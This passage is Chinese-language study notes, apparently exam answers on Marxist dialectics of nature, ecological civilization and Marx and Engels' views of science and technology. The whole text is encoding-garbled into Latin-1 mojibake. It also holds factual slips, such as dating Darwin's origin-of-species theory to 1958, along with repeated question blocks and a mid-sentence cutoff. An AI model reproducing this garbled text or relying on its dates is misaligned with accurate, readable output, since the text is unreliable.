¹æ®ï¼Œä»¥æœªæ¥äººç±»çš„ç»§ç»­å‘å±•ä¸ºç€çœ¼ç‚¹ã€‚äººç±»å¯¹ç”Ÿæ€æ–‡æ˜çš„æ¢ç´¢ï¼Œæ˜¯å¯¹äººä¸è‡ªç„¶å’Œè°å…³ç³»çš„è¡¨ç°ã€‚ç”Ÿæ€æ–‡æ˜ä¸ç”Ÿæ€è‡ªç„¶è§‚æœ‰ç€ç´§å¯†çš„è”ç³»ï¼Œç”Ÿæ€æ–‡æ˜æ˜¯ç”Ÿæ€è‡ªç„¶è§‚çš„åº”æœ‰ä¹‹ä¹‰ï¼Œç”Ÿæ€è‡ªç„¶è§‚å¯¹ç°ä»Šä¸–ç•Œç”Ÿæ€æ–‡æ˜å‘å±•åŠå®è·µæœ‰ç€å¹¿æ³›çš„æŒ‡å¯¼æ„ä¹‰ã€‚ç”Ÿæ€æ–‡æ˜çš„æå‡ºï¼Œæ˜¯äººä»¬å¯¹å¯æŒç»­å‘å±•é—®é¢˜è®¤è¯†æ·±åŒ–çš„å¿…ç„¶ç»“æœã€‚äººç±»é€šè¿‡éµå®ˆå¯æŒç»­æ€§ã€å…±åŒæ€§å’Œå…¬å¹³æ€§ç­‰åŸåˆ™ï¼Œé€šè¿‡å®æ–½èŠ‚èƒ½å‡æ’å’Œå‘å±•ä½ç¢³ç»æµï¼Œæ„å»ºå’Œè°ç¤¾ä¼šå’Œå»ºè®¾ç”Ÿæ€æ–‡æ˜ï¼Œå®ç°äººç±»ç¤¾ä¼šä¸ç”Ÿæ€ç³»ç»Ÿçš„åè°ƒå‘å±•ï¼›äººä¸ç”Ÿæ€ç³»ç»Ÿçš„åè°ƒå‘å±•ä»åº”ä»¥äººç±»ä¸ºä¸»ä½“ï¼Œä»åº”åŒ…æ‹¬æ”¹é€ è‡ªç„¶çš„å†…å®¹ï¼Œæ³¨é‡ä¿æŠ¤ç”Ÿæ€ç¯å¢ƒå’Œé˜²ç¾å‡ç¾ï¼›ç”Ÿæ€è‡ªç„¶ç•Œæ˜¯å¤©ç„¶è‡ªç„¶ç•Œå’Œäººå·¥è‡ªç„¶ç•Œçš„ç»Ÿä¸€ï¼Œæ˜¯äººç±»æ–‡æ˜å‘å±•çš„ç›®æ ‡ï¼Œç”Ÿæ€æ–‡æ˜çš„æå‡ºï¼Œæ˜¯äººä»¬å¯¹å¯æŒç»­å‘å±•é—®é¢˜è®¤è¯†æ·±åŒ–çš„å¿…ç„¶ç»“æœã€‚ç”Ÿæ€è‡ªç„¶è§‚æŒ‡å‡ºï¼Œäººä¸è‡ªç„¶éƒ½æ˜¯ç”Ÿæ€ç³»ç»Ÿä¸­ä¸å¯æˆ–ç¼ºçš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œäººä¸è‡ªç„¶æ˜¯ç›¸äº’ä¾å­˜ã€å’Œè°å…±å¤„ã€å…±åŒä¿ƒè¿›çš„å…³ç³»ã€‚äººç±»çš„å‘å±•åº”è¯¥æ˜¯äººä¸ç¤¾ä¼šã€äººä¸ç¯å¢ƒã€å½“ä»£äººä¸åä»£äººçš„åè°ƒå‘å±•ã€‚äººç±»çš„å‘å±•ä¸ä»…è¦è®²ç©¶ä»£å†…å…¬å¹³ï¼Œè€Œä¸”è¦è®²ç©¶ä»£é™…ä¹‹é—´çš„å…¬å¹³ï¼Œä¸èƒ½ä»¥å½“ä»£äººçš„åˆ©ç›Šä¸ºä¸­å¿ƒï¼Œç”šè‡³ä¸ºäº†å½“ä»£äººçš„åˆ©ç›Šè€Œä¸æƒœç‰ºç‰²åä»£äººçš„åˆ©ç›Šã€‚è€Œå¿…é¡»è®²ç©¶ç”Ÿæ€æ–‡æ˜ï¼Œç‰¢å›ºæ ‘ç«‹èµ·å¯æŒç»­å‘å±•çš„ç”Ÿæ€æ–‡æ˜è§‚ã€‚ 4.å¦‚ä½•ç†è§£â€œç»¿æ°´é’å±±å°±æ˜¯é‡‘å±±é“¶å±±â€ï¼Ÿ â€œç»¿æ°´é’å±±å°±æ˜¯é‡‘å±±é“¶å±±â€çš„é‡è¦æ€æƒ³ï¼Œè§¦åŠåˆ°äº†ä¸€ä¸ªäººç±»ç¤¾ä¼šå‘å±•çš„å¤§éš¾é¢˜ï¼Œå³ï¼šé‡‘å±±é“¶å±±æ˜¯äººçš„ç‰©è´¨è¿½æ±‚ï¼Œç»¿æ°´é’å±±æ˜¯äººèµ–ä»¥ç”Ÿå­˜çš„è‡ªç„¶æ¡ä»¶ï¼Œè¿™ä¸¤è€…éƒ½æ˜¯äººç”Ÿå­˜å’Œå‘å±•æ‰€éœ€è¦çš„ï¼Œè€Œè¿™ä¸¤è€…å¯¹äºäººæ¥è¯´åˆå¾ˆéš¾å…¼å¾—ã€‚è‡ªå·¥ä¸šé©å‘½ä»¥æ¥ï¼Œäººç±»ä»¥ç‰ºç‰²ç»¿æ°´é’å±±æ¥å®ç°è‡ªå·±çš„ç‰©è´¨è¿½æ±‚ï¼Œæ›¾ç»åˆ›é€ äº†å‰æ‰€æœªæœ‰çš„æ–‡æ˜å¥‡è¿¹ã€‚ä½†æ˜¯ï¼Œè¿™ç§ä¸å¯æŒç»­çš„ç»æµå¢é•¿æ–¹å¼é€ æˆäº†è®¸å¤šç¾éš¾æ€§çš„åæœï¼Œä¿ƒä½¿äººä»¬åœ¨å¯¹ä¼ ç»Ÿçš„å¢é•¿æ–¹å¼å’Œå‘å±•ç†è®ºè¿›è¡Œåæ€çš„åŒæ—¶ï¼Œå¼€å§‹é‡æ–°ç ”ç©¶å‘å±•ç†è®ºï¼Œé‡æ–°ç ”ç©¶å‘å±•ä¸­äººä¸è‡ªç„¶çš„å…³ç³»ã€‚ ä»¥æˆ‘å›½ä¸ºä¾‹ï¼Œæˆ‘ä»¬åœ¨è¿‡å»å®è¡Œçš„æ˜¯â€œå…ˆå¢é•¿åæ²»æ±¡â€æ¨¡å¼ï¼Œåœ¨â€œä¸¤åº§å±±â€é—®é¢˜ä¸Šå®é™…ä¸Šæ˜¯é‡‡å–äº†â€œä¸ºäº†é‡‘å±±é“¶å±±å¯ä»¥æš‚æ—¶ç‰ºç‰²ç»¿æ°´é’å±±â€çš„åšæ³•;åæ¥è®¤è¯†åˆ°è¿™æ ·åšä¸ä»…ä¸å¯æŒç»­ï¼Œè€Œä¸”æ²»æ±¡çš„ä»£ä»·è¦å¤§äºå¢é•¿è·å¾—çš„æ”¶ç›Šï¼Œäºæ˜¯è®¸å¤šåœ°æ–¹æå‡ºäº†â€œå®è¦ç»¿æ°´é’å±±ï¼Œä¸è¦é‡‘å±±é“¶å±±â€çš„å£å·ï¼Œå³ä¸‹å†³å¿ƒæ”¹å˜â€œå…ˆå¢é•¿åæ²»æ±¡â€çš„æ¨¡å¼ï¼Œä¼˜åŒ–ç¯å¢ƒï¼Œä¿æŠ¤ç”Ÿæ€ã€‚è¿™æ ·çš„å£å·ï¼Œè¿™æ ·çš„åšæ³•ï¼Œè™½ç„¶ä¹Ÿè®²â€œå¯æŒç»­å‘å±•â€ï¼Œä½†å®é™…ä¸Šæ˜¯æŠŠâ€œå¯æŒç»­â€ä¸â€œå‘å±•â€å‰²è£‚å¼€æ¥ï¼Œè¿™ä¸åˆ©äºç”Ÿäº§åŠ›çš„å‘å±•ã€‚ â€œç»¿æ°´é’å±±å°±æ˜¯é‡‘å±±é“¶å±±â€ï¼Œåˆ™ä»¥â€œå°±æ˜¯â€ä¸€è¯æŠŠâ€œç»¿æ°´é’å±±â€å’Œâ€œé‡‘å±±é“¶å±±â€è¾©è¯åœ°è¿æ¥èµ·æ¥ï¼Œä»¥ç§¯æçš„è€Œä¸æ˜¯æ‚²è§‚çš„æ€åº¦é˜æ˜äº†è¿™ä¸¤è€…ä¹‹é—´çš„å…³ç³»ï¼Œè®²æ¸…æ¥šäº†å‘å±•ä¸­äººä¸è‡ªç„¶çš„è¾©è¯ç»Ÿä¸€å…³ç³»ç»¿æ°´é’å±±å°±æ˜¯é‡‘å±±é“¶å±±â€è¿™ä¸€é‡è¦æ€æƒ³ï¼Œæ‰€è¡¨è¾¾çš„åˆ™æ˜¯ç¯å¢ƒã€ç”Ÿæ€åº”è¯¥æ˜¯ç¤¾ä¼šç”Ÿäº§åŠ›å†…éƒ¨çš„ä¸€ä¸ªæœ‰æœºç»„æˆéƒ¨åˆ†ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œä¹ è¿‘å¹³æŠŠç¯å¢ƒã€ç”Ÿæ€çº³å…¥äº†ç¤¾ä¼šç”Ÿäº§åŠ›çš„èŒƒç•´ã€‚è¿™ç§æ€åº¦å°±æ˜¯é©¬å…‹æ€ä¸»ä¹‰çš„æ€åº¦ï¼Œè¿™ç§è®¤è¯†å°±æ˜¯é©¬å…‹æ€ä¸»ä¹‰çš„è®¤è¯†ã€‚ã€‚ å› æ­¤ï¼Œæˆ‘ä»¬è¯´ä¹ è¿‘å¹³å…³äºâ€œç»¿æ°´é’å±±å°±æ˜¯é‡‘å±±é“¶å±±â€çš„é‡è¦æ€æƒ³ï¼Œä»¥ä¸€ç§æ–°é¢–çš„å‘å±•ç†å¿µï¼ŒåšæŒå’Œå‘å±•äº†é©¬å…‹æ€ä¸»ä¹‰åˆ›å§‹äººä»¥ç§¯æä¹è§‚çš„æ€åº¦è®¤è¯†å’Œå¤„ç†å‘å±•ä¸­äººä¸è‡ªç„¶å…³ç³»é—®é¢˜çš„ç§‘å­¦æ€æƒ³ã€‚ 5.ç®€è¿°è¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚æˆ˜èƒœæœºæ¢°è®ºè‡ªç„¶è§‚çš„å†å²å¿…ç„¶æ€§ã€‚ æœºæ¢°è®ºè‡ªç„¶è§‚çš„äº§ç”Ÿæœ‰å…¶å†å²çš„å¿…ç„¶æ€§å’Œåˆç†æ€§ï¼Œä½†å®ƒç”¨å­¤ç«‹çš„ï¼Œé™æ­¢çš„ï¼Œç‰‡é¢çš„è§‚ç‚¹å»çœ‹å¾…ä¸–ç•Œï¼Œå¦è®¤äº‹ç‰©çš„è”ç³»å’Œå‘å±•å˜åŒ–ï¼Œå¦è®¤äº‹ç‰©çš„å†…éƒ¨çŸ›ç›¾ã€‚å®è·µæ˜¯æ£€éªŒçœŸç†çš„å”¯ä¸€æ ‡å‡†ï¼Œæœºæ¢°è®ºè‡ªç„¶è§‚çš„è¿™äº›ç‰¹ç‚¹ä¸è¿‘ä»£è‡ªç„¶ç§‘å­¦å·²ç»ç›¸æ‚–ï¼Œåº”å½“æ‘’å¼ƒã€‚äººç±»ç¤¾ä¼šçš„å¤§è¶‹åŠ¿æ˜¯å‘å±•ï¼Œåœ¨ç›®å‰çš„å†å²ç¯å¢ƒä¸‹ï¼Œæœºæ¢°è®ºè‡ªç„¶è§‚çš„å­˜åœ¨åªä¼šé˜»ç¢è¿™ç§å‘å±•ï¼Œæ‰€ä»¥å¿…å°†è¢«é€‚åº”å½“å‰è‡ªç„¶ç§‘å­¦çš„è¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚æ‰€å–ä»£ï¼Œè¿™æ˜¯å†å²å¿…ç„¶æ€§ã€‚ P28 ç¬¬äºŒç«  ç§‘å­¦æŠ€æœ¯è§‚ï¼ˆbyselfï¼‰ 6.å¦‚ä½•ç†è§£18.19ä¸–çºªç§‘å­¦æŠ€æœ¯å‘å±•ä¸é©¬å…‹æ€æ©æ ¼æ–¯ç§‘å­¦æŠ€æœ¯æ€æƒ³äº§ç”Ÿçš„å…³ç³»ï¼Ÿ p45 ä»18ä¸–çºª60å¹´ä»£èµ·å§‹äºè‹±å›½çš„ç¬¬ä¸€å¤´æ¬¡æŠ€æœ¯é©å‘½å’Œç»§ä¹‹è€Œæ¥çš„äº§ä¸šé©å‘½ï¼Œæ—¢å‘ç§‘å­¦æå‡ºäº†æ–°çš„è¦æ±‚ï¼Œä¹Ÿä¸ºç§‘å­¦æä¾›äº†æ–°çš„äº‹å®ï¼Œæ›´ä¸ºç§‘å­¦æä¾›äº†æ–°çš„äº¤æµæ–¹æ³•ï¼Œä»è€Œä½¿ç§‘å­¦åœ¨19ä¸–çºªè·å¾—äº†é•¿è¶³çš„è¿›æ­¥ï¼Œå–å¾—äº†å½±å“æ·±è¿œçš„ä¸€äº›é‡è¦å‘ç°ï¼Œä¸ºè¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„äº§ç”Ÿæä¾›äº†ä¸°å¯Œçš„ç‰©è´¨åŸºç¡€ 19ä¸–çºªçš„è‡ªç„¶ç§‘å­¦æˆå°±ä¸ºè¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚äº§ç”Ÿæä¾›äº†ç§‘å­¦å‰æã€‚å¦‚åœ¨å¤©æ–‡å­¦ä¸Šï¼Œ1755å¹´åº·å¾·å’Œæ‹‰æ™®æ‹‰æ–¯ï¼ˆ1796å¹´ï¼‰åˆ†åˆ«æå‡ºçš„å…³äºå¤ªé˜³ç³»èµ·æºçš„æ˜Ÿå»å‡è®¾ã€‚åœ¨åœ°è´¨å­¦ä¸Šï¼Œè‹±å›½ç§‘å­¦å®¶è±ä¼Šå°”1830å¹´å‘è¡¨â€œåœ°çƒæ¼”åŒ–å­¦è¯´â€ï¼Œåœ¨ç‰©ç†å­¦ä¸Šç„¦è€³å‘ç°èƒ½é‡è½¬åŒ–å’Œå®ˆæ’å®šå¾‹ï¼Œä»è€ŒåŠ¨æ‘‡äº†å½¢è€Œä¸Šå­¦çš„åŸºç¡€ï¼Œåœ¨åŒ–å­¦ä¸Š1824å¹´ç”±ç»´ç­‰äººåˆæˆå°¿ç´ ï¼Œåœ¨ç”Ÿç‰©ä¸Šï¼Œ1838å¹´æ–½æ—ºæå‡ºç»†èƒæ˜¯ç”Ÿå‘½ çš„åŸºæœ¬ç»“æ„å•ä½ï¼Œ1958å¹´è¾¾å°”æ–‡åˆ›ç«‹ç‰¹ç§èµ·æºè®ºï¼Œå¯¹äºè¿™äº›é‡è¦çš„å‘ç°ï¼Œæ©æ ¼æ–¯ç»è¿‡åå¤ç ”ç©¶ï¼Œä»è‡ªç„¶è§‚çš„é«˜åº¦æå‡ºäº†è¿åŠ¨å½¢å¼åŠå…¶ç›¸äº’è½¬åŒ–çš„å­¦è¯´ã€‚æ©æ ¼æ–¯å…³äºè¿åŠ¨å½¢å¼çš„å­¦è¯´æŠŠè•´å«åœ¨å½“æ—¶è¯¸å¤šç§‘å­¦å‘ç°ä¸­çš„æ€æƒ³ç²¾åä½œäº†æ¦‚å¿µæ€§å‡åï¼Œä»è€Œæä¾›äº†ä¸€ç§è§‚å¯Ÿç ”ç©¶è‡ªç„¶çš„å“²å­¦æ–¹å¼ ç»¼ä¸Šæ‰€è¿°ï¼Œè¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„äº§ç”Ÿåæ˜ äº†ç§‘å­¦æŠ€æœ¯å‘å±•çš„å†å²å¿…ç„¶æ€§ã€‚ 7.æ€æ ·è®¤è¯†é©¬å…‹æ€æ©æ ¼æ–¯çš„ç§‘å­¦æŠ€æœ¯æ€æƒ³åœ¨é©¬å…‹æ€ä¸»ä¹‰ç†è®ºä½“ç³»ä¸­çš„é‡è¦åœ°ä½ï¼Ÿ é©¬å…‹æ€ä¸»ä¹‰ç†è®ºä½“ç³»ï¼Œæ˜¯å…³äºå…¨ä¸–ç•Œæ— äº§é˜¶çº§å’Œå…¨äººç±»å½»åº•è§£æ”¾çš„å­¦è¯´ã€‚å®ƒç”±é©¬å…‹æ€ä¸»ä¹‰å“²å­¦ã€é©¬å…‹æ€ä¸»ä¹‰æ”¿æ²»ç»æµå­¦å’Œç§‘å­¦ç¤¾ä¼šä¸»ä¹‰ä¸‰å¤§éƒ¨åˆ†ç»„æˆï¼Œæ˜¯é©¬å…‹æ€ã€æ©æ ¼æ–¯åœ¨æ‰¹åˆ¤åœ°ç»§æ‰¿å’Œå¸æ”¶äººç±»å…³äºè‡ªç„¶ç§‘å­¦ã€æ€ç»´ç§‘å­¦ã€ç¤¾ä¼šç§‘å­¦ä¼˜ç§€æˆæœçš„åŸºç¡€ä¸Šäº19ä¸–çºª40å¹´ä»£åˆ›ç«‹çš„ï¼Œå¹¶åœ¨å®è·µä¸­ä¸æ–­åœ°ä¸°å¯Œã€å‘å±•å’Œå®Œå–„çš„æ— äº§é˜¶çº§æ€æƒ³çš„ç§‘å­¦ä½“ç³»ã€‚ é©¬å…‹æ€æ©æ ¼æ–¯ç§‘å­¦æŠ€æœ¯æ€æƒ³è¡¨æ˜äº†ç§‘å­¦æŠ€æœ¯æ˜¯æ¨åŠ¨ç¤¾ä¼šå‘å±•çš„é©å‘½åŠ›é‡ï¼Œé€šè¿‡å¯¹ç§‘å­¦æŠ€æœ¯çš„ç†è§£ã€ç§‘å­¦çš„åˆ†ç±»ã€ç§‘å­¦æŠ€æœ¯ä¸å“²å­¦çš„å…³ç³»ã€ç§‘å­¦æŠ€æœ¯æ˜¯ç”Ÿäº§åŠ›ã€ç§‘å­¦æŠ€æœ¯çš„ç”Ÿäº§åŠ¨å› ã€ç§‘å­¦æŠ€æœ¯çš„ç¤¾ä¼šåŠŸèƒ½ã€ç§‘å­¦æŠ€æœ¯ä¸ç¤¾ä¼šåˆ¶åº¦ã€ç§‘å­¦ä¸æŠ€æœ¯çš„ç›¸äº’å…³ç³»ã€ç§‘å­¦æŠ€æœ¯å¼‚åŒ–ç­‰æ–¹é¢è§‚ç‚¹çš„é˜è¿°ï¼Œæå¤§çš„ä¸°å¯Œå’Œå‘å±•äº†é©¬å…‹æ€ä¸»ä¹‰ç†è®ºï¼Œæœ‰åŠ©äºæŒ‡å¯¼æˆ‘ä»¬æ­£ç¡®åˆ†æç§‘å­¦æŠ€æœ¯åŠå…¶å‘å±•çš„ç†è®ºå’Œç°å®é—®é¢˜ã€‚ 8.é©¬æ©ä¸å›½å¤–å­¦è€…å…³äºç§‘æŠ€çš„æœ¬è´¨åŒºåˆ«p51-55 9.å¦‚ä½•ç†è§£ç§‘å­¦æŠ€æœ¯ä¸€ä½“åŒ–çš„ç‰¹å¾ï¼Ÿ åœ¨äººç±»å†å²ä¸Šï¼Œç§‘å­¦ä¸æŠ€æœ¯ç»å†äº†å‡ æ¬¡åˆ†åˆã€‚ç§‘å­¦ä¸æŠ€æœ¯æºèµ·äºäººç±»çš„ç¤¾ä¼šç”Ÿäº§å®è·µï¼Œæœ¬æ¥æ˜¯å†…åœ¨ç»Ÿä¸€çš„ï¼Œä½†éšç€ç”Ÿäº§åŠ›çš„å‘å±•ï¼Œå‡ºç°äº†è„‘åŠ›åŠ³åŠ¨ä¸ä½“åŠ›åŠ³åŠ¨çš„åˆ†å·¥ï¼Œä¸€éƒ¨åˆ†äººä»å•çº¯çš„ä½“åŠ›åŠ³åŠ¨ä¸­åˆ†åŒ–å‡ºæ¥ï¼Œä¸“é—¨ä»äº‹æ”¿æ²»ã€å®—æ•™ã€è‰ºæœ¯ã€å“²å­¦ç­‰æ´»åŠ¨ï¼Œç§‘å­¦ä¸æŠ€æœ¯ä»æ­¤åˆ†é“æ‰¬é•³ï¼Œç§‘å­¦æ´»åŠ¨ç”±å­¦è€…ä»¬æ‰¿æ‹…ï¼ŒæŠ€æœ¯ç ”ç©¶åˆ™ç”±å·¥åŒ ä»¬æŒæ¡ã€‚åœ¨å¤ä»£ï¼Œç§‘å­¦å¯¹æŠ€æœ¯çš„å½±å“ç”šå¾®ï¼Œæ— è®ºæ˜¯è‡ªç„¶ç»æµæ¡ä»¶ä¸‹çš„å†œä¸šæŠ€æœ¯ï¼Œè¿˜æ˜¯å·¥åŒ çš„æ‰‹å·¥ä¸šæŠ€æœ¯ï¼Œéƒ½æ˜¯å‡­ç»éªŒæŒæ¡å’Œç§¯ç´¯çš„ï¼Œé‚£æ—¶å‡ ä¹æ²¡æœ‰ä»¥ç§‘å­¦çš„åº”ç”¨ä¸ºç‰¹å¾çš„æŠ€æœ¯ï¼Œè€Œåªæœ‰æ‰‹è‰ºã€æŠ€èƒ½â€”â€”å°½ç®¡è¿™äº›ç»éªŒå¯èƒ½å‘å±•åˆ°æƒŠäººçš„æ°´å¹³ã€‚ ä»15ä¸–çºªä¸‹åŠå¶è¿‘ä»£è‡ªç„¶ç§‘å­¦äº§ç”Ÿä»¥åï¼Œç›´åˆ°19ä¸–çºªçš„ä¸ŠåŠå¶ï¼Œç§‘å­¦çš„å®é™…åº”ç”¨æ‰é€æ­¥æ˜¾ç°æ•ˆèƒ½ã€‚æ­£å¦‚é©¬å…‹æ€æ‰€è¯´ï¼šåªæœ‰åœ¨èµ„æœ¬ä¸»ä¹‰æ¡ä»¶ä¸‹ï¼Œæ‰ç¬¬ä¸€æ¬¡äº§ç”Ÿäº†åªæœ‰ç”¨ç§‘å­¦æ–¹æ³•æ‰èƒ½è§£å†³çš„å®é™…é—®é¢˜ï¼Œæ‰ç¬¬ä¸€æ¬¡è¾¾åˆ°ä½¿ç§‘å­¦çš„åº”ç”¨æˆä¸ºå¯èƒ½å’Œå¿…è¦çš„é‚£æ ·ä¸€ç§è§„æ¨¡ï¼Œç§‘å­¦è·å¾—äº†æˆä¸ºè‡´å¯Œæ‰‹æ®µçš„ä½¿ç”¨ï¼Œå‘æ˜æˆä¸ºä¸€ç§ç‰¹æ®Šçš„èŒä¸šï¼Œç§‘å­¦æˆä¸ºç”Ÿäº§è¿‡ç¨‹çš„å› ç´ ï¼Œç”Ÿäº§è¿‡ç¨‹æˆä¸ºç§‘å­¦çš„åº”ç”¨ã€‚15ä¸–çºªä»¥åï¼Œç§‘å­¦å®éªŒæ´»åŠ¨èå…¥ç§‘å­¦ç ”ç©¶20ç§‘å­¦æˆå°±æ˜¯åœ¨æŠ€æœ¯åŸºç¡€ä¸Šçš„â€œæŠ€æœ¯ç§‘å­¦åŒ–â€çš„ç»“æœï¼ŒæŠ€æœ¯å¯ä»¥äº§ç”Ÿç§‘å­¦ï¼Œâ€œæŠ€æœ¯ç§‘å­¦åŒ–â€è¡¨æ˜:æŠ€æœ¯æ˜¯ç§‘å­¦å‘å±•çš„åŠ¨åŠ› ï¼Œç§‘å­¦éœ€è¦æ¨åŠ¨æŠ€æœ¯å‰è¿›ï¼›æŠ€æœ¯ä¸ºç§‘å­¦çš„å‘å±•æä¾›ç ”ç©¶æ‰‹æ®µï¼Œç‰¹åˆ«æ˜¯ç§‘å­¦å® 10.ä¸ºä»€ä¹ˆè¯´ç§‘å­¦å‘å±•è¡¨ç°ä¸ºç»§æ‰¿ä¸åˆ›æ–°çš„ç»Ÿä¸€ï¼Ÿï¼ˆp62ï¼‰ 11.æ€æ ·è®¤è¯†æŠ€æœ¯å‘å±•çš„åŠ¨åŠ›ï¼Ÿå¯¹æŠ€æœ¯å…·æœ‰åŒåˆƒå‰‘ä½œç”¨çš„çœ‹æ³•ï¼Ÿ æŠ€æœ¯å‘å±•å²ä¸æ–­è¯æ˜,æŠ€æœ¯åƒä¸€æŠŠåŒåˆƒå‰‘,æ—¢æœ‰æœ‰ç›Šäºäººç±»å‘å±•çš„ä¸€é¢,ä¹Ÿæœ‰å±å®³äººç±»åˆ©ç›Šçš„ä¸€é¢ã€‚ä¸€æ–¹é¢ï¼ŒæŠ€æœ¯çš„è¿›æ­¥æ¨åŠ¨äº†ç”Ÿäº§åŠ›å†…éƒ¨å„è¦ç´ çš„å˜é©ï¼Œä¿ƒè¿›äº†äº§ä¸šç»“æ„çš„è°ƒæ•´ã€ç»æµå½¢å¼çš„å˜åŒ–å’Œç»æµå¢é•¿æ–¹å¼çš„å˜åŒ–ï¼Œå®ç°äº†ç»æµè½¬å‹ï¼›å˜é©äº†ç”Ÿäº§å…³ç³»ï¼Œå¢è¿›äº†äººç±»è‡ªç”±è€Œå…¨é¢çš„å‘å±•ï¼Œæ¨åŠ¨äººç±»ç¤¾ä¼šè¿›å…¥å‘å±•çš„æ–°é˜¶æ®µï¼›å°†äººç±»ä»ç¹é‡çš„åŠ³åŠ¨ä¸­è§£æ”¾å‡ºæ¥ï¼Œå¯¹äººç±»çš„ç”Ÿæ´»æ–¹å¼äº§ç”Ÿäº†æ·±åˆ»çš„å½±å“ã€‚å¦ä¸€æ–¹é¢ï¼ŒæŠ€æœ¯çš„è¿›æ­¥ä¹Ÿäº§ç”Ÿäº†ä¸€äº›é“å¾·å’Œä¼¦ç†é—®é¢˜ï¼Œå¦‚å…‹éš†äººçš„ä¼¦ç†é—®é¢˜ã€åŸºå› æ²»ç–—å’ŒåŸºå› å¢å¼ºçš„ä¼¦ç†é—®é¢˜ã€ç½‘ç»œä¼¦ç†é—®é¢˜ã€æ ¸ä¼¦ç†é—®é¢˜ç­‰ã€‚ å› æ­¤ï¼Œå¿…é¡»ä»¥äººæ°‘ä¸ºä¸­å¿ƒï¼Œå¤§åŠ›å‘å±•äº‹å…³å›½è®¡æ°‘ç”Ÿçš„ç§‘å­¦æŠ€æœ¯ï¼›å¿…é¡»ä»¥å…ˆè¿›çš„æ–‡åŒ–æ¥å¼•å¯¼ï¼Œåè°ƒç§‘å­¦æ–‡åŒ–ä¸äººæ–‡æ–‡åŒ–çš„å†²çªï¼›å¿…é¡»æ”¹å˜å•çº¯æœ‰åˆ©äºç»æµå¢é•¿çš„å€¾å‘ï¼Œèµ°ç»æµå¢é•¿ä¸ç¯å¢ƒä¿æŠ¤åŒèµ¢ä¹‹è·¯ï¼›å¿…é¡»å®¢è§‚å…¨é¢è¯„ä»·ç§‘å­¦æŠ€æœ¯çš„é£é™©å’Œæ”¶ç›Šï¼ŒæŒ‡å®šæ°å½“çš„ç§‘å­¦æŠ€æœ¯å…¬å…±æ”¿ç­–ã€‚ ç¬¬äºŒç«  ç§‘å­¦æŠ€æœ¯è§‚ 1.å¦‚ä½•ç†è§£18ã€19ä¸–çºªç§‘å­¦æŠ€æœ¯å‘å±•ä¸é©¬å…‹æ€ã€æ©æ ¼æ–¯ç§‘å­¦æŠ€æœ¯æ€æƒ³äº§ç”Ÿçš„å…³ç³»ï¼Ÿ 18ã€19ä¸–çºªï¼Œå¤©æ–‡å­¦ã€åœ°ç†å­¦ã€ç‰©ç†å­¦ã€åŒ–å­¦ã€è§£å‰–å­¦ã€ç”Ÿç‰©å­¦ç­‰éƒ½æœ‰äº†é•¿è¶³çš„å‘å±•ï¼Œç‰¹åˆ«æ˜¯èƒ½é‡å®ˆæ’ä¸è½¬åŒ–å®šå¾‹ã€ç»†èƒå­¦è¯´å’Œç”Ÿç‰©è¿›åŒ–è®ºä¸‰å¤§å‘ç°ï¼Œä½¿è‡ªç„¶ç§‘å­¦çš„å‘å±•è¿›å…¥äº†ä¸€ä¸ªæ–°æ—¶æœŸï¼Œä¸¤æ¬¡ç§‘æŠ€é©å‘½ä½¿äººç±»è¿›å…¥äº†å·¥ä¸šæ–‡æ˜æ—¶ä»£ã€‚é©¬å…‹æ€ã€æ©æ ¼æ–¯åœ¨æ€»ç»“å’Œæ¦‚æ‹¬19ä¸–çºªç§‘å­¦æŠ€æœ¯æˆæœçš„åŸºç¡€ä¸Šï¼Œå½¢æˆäº†ä»¥è¾©è¯å”¯ç‰©ä¸»ä¹‰ä¸ºç†è®ºåŸºç¡€çš„ç§‘å­¦æŠ€æœ¯æ€æƒ³ã€‚ 2.æ€æ ·è®¤è¯†é©¬å…‹æ€ã€æ©æ ¼æ–¯çš„ç§‘å­¦æŠ€æœ¯æ€æƒ³åœ¨é©¬å…‹æ€ä¸»ä¹‰ç†è®ºä½“ç³»ä¸­çš„åœ°ä½ï¼Ÿ é©¬å…‹æ€ä¸»ä¹‰ç§‘å­¦æŠ€æœ¯è§‚æ˜¯åŸºäºé©¬å…‹æ€ã€æ©æ ¼æ–¯çš„ç§‘å­¦æŠ€æœ¯æ€æƒ³ï¼Œå¯¹ç§‘å­¦åŸºç¡€æœºå™¨å‘å±•è§„å¾‹çš„æ¦‚æ‹¬å’Œæ€»ç»“ï¼Œæ˜¯é©¬å…‹æ€ä¸»ä¹‰å…³äºç§‘å­¦æŠ€æœ¯çš„æœ¬ä½“è®ºå’Œè®¤è¯†è®ºã€‚ ä»è¾©è¯å”¯ç‰©ä¸»ä¹‰å’Œå†å²å”¯ç‰©ä¸»ä¹‰çš„åŸºæœ¬ç«‹åœºå‡ºå‘ï¼Œåœ¨æ€»ä½“ä¸ŠæŠŠæ¡é©¬å…‹æ€ã€æ©æ ¼æ–¯çš„ç§‘å­¦æŠ€æœ¯æ€æƒ³ï¼›é©¬å…‹æ€ä¸»ä¹‰è®¤ä¸ºç§‘å­¦æ˜¯ä¸€èˆ¬ç”Ÿäº§åŠ›ï¼ŒæŠ€æœ¯æ˜¯ç°å®ç”Ÿäº§åŠ›ï¼›ç§‘å­¦æ˜¯è®¤è¯†ä¸–ç•Œï¼ŒæŠ€æœ¯æ˜¯æ”¹é€ ä¸–ç•Œã€‚ç°ä»£ç§‘å­¦å’ŒæŠ€æœ¯å½¢æˆæ—¢æœ‰åŒºåˆ«åˆæœ‰è”ç³»çš„ä½“ç³»ç»“æ„ã€‚ 3.é©¬å…‹æ€ã€æ©æ ¼æ–¯å’Œå›½å¤–å­¦è€…å…³äºç§‘å­¦æŠ€æœ¯æœ¬è´¨çš„åˆ†ææœ‰ä½•ä¸»è¦å·®å¼‚ï¼Ÿ ï¼ˆ1ï¼‰é©¬å…‹æ€ã€æ©æ ¼æ–¯å…³äºæŠ€æœ¯æœ¬è´¨ç‰¹å¾çš„åˆ†æ é©¬å…‹æ€ã€æ©æ 